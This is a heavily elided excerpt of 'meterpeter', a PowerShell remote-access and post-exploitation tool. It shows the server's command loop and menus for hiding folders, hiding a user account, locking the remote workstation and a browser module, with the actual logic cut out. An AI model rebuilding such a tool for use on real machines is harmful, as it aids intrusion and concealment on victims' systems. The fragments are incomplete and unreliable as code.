...
.SYNOPSIS
   ...
   PS Script Dev Version: v2.10.10.14
...
While($Client.Connected)
{
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "settings")
    {
      ...
      write-host " ---------------";
      write-host " meterpeter dev        : ${CmdLetVersion}.14";
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      write-host "   Hidden    Manage super\hidden folders     Query\Create\Delete super hidden dir";
      ...
      If($choise -ieq "Hidden")
      {
         ...
         {
            Write-Host " Query for regular hidden folders" -ForegroundColor Blue -BackgroundColor White;
      ...
      If($choise -ieq "hideUser")
      {
         ...
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:HiddeUser> " -NoNewline -ForeGroundColor Green;
      ...
      If($choise -ieq "LockPC" -or $choise -ieq "lock")
      {
        ...
        {
           write-host " Lock Remote WorkStation." -ForegroundColor Blue -BackgroundColor White;write-host "`n`n";
      ...
      If($choise -ieq "Browser" -or $choice -ieq "browser")
      {
        ...
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Browser> " -NoNewline -ForeGroundColor Green;
